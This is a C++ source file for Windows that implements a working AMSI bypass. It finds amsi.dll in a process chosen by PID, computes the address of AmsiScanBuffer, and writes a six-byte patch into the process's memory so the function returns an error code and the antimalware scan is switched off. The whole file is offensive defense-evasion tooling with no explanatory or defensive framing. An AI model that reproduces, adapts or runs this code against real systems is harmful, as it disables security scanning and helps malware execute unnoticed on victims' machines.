#include <iostream>
#include <vector>
#include <string>
#include <windows.h>
#include <TlHelp32.h>

uintptr_t get_target_amsi_address(DWORD pid, const std::wstring& dll);
uintptr_t get_api_offset(const std::string& dll, const std::string& api);

int main() {
    DWORD pid;
    std::cout << "Input target PID: ";
    if (!(std::cin >> pid)) return 1;

    uintptr_t amsi_address = get_target_amsi_address(pid, L"amsi.dll");
    uintptr_t offset = get_api_offset("amsi.dll", "AmsiScanBuffer");
    if (amsi_address == 0 || offset == 0) {
        std::cerr << "[-] Failed to find addresses." << std::endl;
        return 1;
    }

    uintptr_t api_address = amsi_address + offset;
    std::cout << "[+] Patch target address: " << reinterpret_cast<void*>(api_address) << std::endl;
    
    // mov eax,0x80070057
    // ret
    std::vector<unsigned char> patch = {0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3};

    HANDLE process_handle = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, pid);
    if (process_handle) {
        SIZE_T written;
        if (WriteProcessMemory(process_handle, reinterpret_cast<LPVOID>(api_address), patch.data(), patch.size(), &written)) {
            std::cout << "[!] AmsiScanBuffer patched successfully." << std::endl;
        } else {
            std::cerr << "[-] WriteProcessMemory failed. Error: " << GetLastError() << std::endl;
        }
        CloseHandle(process_handle);
    } else {
        std::cerr << "[-] OpenProcess failed. Error: " << GetLastError() << std::endl;
    }

    return 0;
}

uintptr_t get_target_amsi_address(DWORD pid, const std::wstring& dll) {
    HANDLE process_handle = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, pid);
    if (process_handle == INVALID_HANDLE_VALUE) return 0;

    MODULEENTRY32W me32 = {sizeof(MODULEENTRY32W)};
    uintptr_t base_address = 0;
    if (Module32FirstW(process_handle, &me32)) {
        do {
            if (_wcsicmp(me32.szModule, dll.c_str()) == 0) {
                base_address = reinterpret_cast<uintptr_t>(me32.modBaseAddr);
                break;
            }
        } while (Module32NextW(process_handle, &me32));
    }
    CloseHandle(process_handle);
    return base_address;
}

uintptr_t get_api_offset(const std::string& dll, const std::string& api) {
    HMODULE dll_library = LoadLibraryA(dll.c_str());
    if (!dll_library) return 0;

    void* api_address = reinterpret_cast<void*>(GetProcAddress(dll_library, api.c_str()));
    uintptr_t offset = reinterpret_cast<uintptr_t>(api_address) - reinterpret_cast<uintptr_t>(dll_library);

    FreeLibrary(dll_library);
    return offset;
}